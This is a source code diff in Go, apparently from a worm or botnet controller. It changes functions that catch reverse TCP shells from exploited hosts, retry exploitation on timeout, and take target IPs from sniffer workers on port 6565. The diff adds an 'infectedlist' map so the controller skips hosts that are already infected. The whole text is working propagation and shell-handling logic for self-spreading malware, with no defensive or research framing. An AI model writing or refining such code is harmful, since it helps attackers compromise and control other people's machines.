@@ -32,7 +32,7 @@ func ListenAndHandleTCPShell(listener net.Listener, ip string, exploit_request_c
     select{
     case conn = <- connchan:
       i = -1
-    case <- time.After(6000 * time.Millisecond)://timeout
+    case <- time.After(9000 * time.Millisecond)://timeout
       fmt.Println("No connection found, attempting to exploit again")
       exploit_request_channel <- ip
     }
@@ -40,8 +40,8 @@ func ListenAndHandleTCPShell(listener net.Listener, ip string, exploit_request_c
       break
     }
     i++
-    if i == 6 {
-      fmt.Println("Failed to exploit target after 6 tries: " + ip)
+    if i == 3 {
+      fmt.Println("Failed to exploit target after 3 tries: " + ip)
       return
     }
   }
@@ -71,6 +71,7 @@ func ListenAndHandleTCPShell(listener net.Listener, ip string, exploit_request_c
 
 func ListenForSnifferData(ip_passing_channel chan string){
   listener, _ := net.Listen("tcp", ":6565")
+  infectedlist := make(map[string]int)
   for {
     conn, err := listener.Accept()
     if err != nil {
@@ -83,8 +84,13 @@ func ListenForSnifferData(ip_passing_channel chan string){
     if readerr != nil {
       fmt.Println("We gotta error reading from the sniffer: " + readerr.Error())
     }
-    fmt.Println("Read IP: " + ip + " from worker " + conn.RemoteAddr().String())
-    fmt.Println("Listener is passing IPs")
-    ip_passing_channel <- ip
+    if infectedlist[ip] == 0 {
+      infectedlist[ip] = 1
+      fmt.Println("Read IP: " + ip + " from worker " + conn.RemoteAddr().String())
+      fmt.Println("Listener is passing IPs")
+      ip_passing_channel <- ip
+    } else {
+      fmt.Println("Read IP: " + ip + " from worker " + conn.RemoteAddr().String() + ", but it has already been infected")
+    }
   }
 }
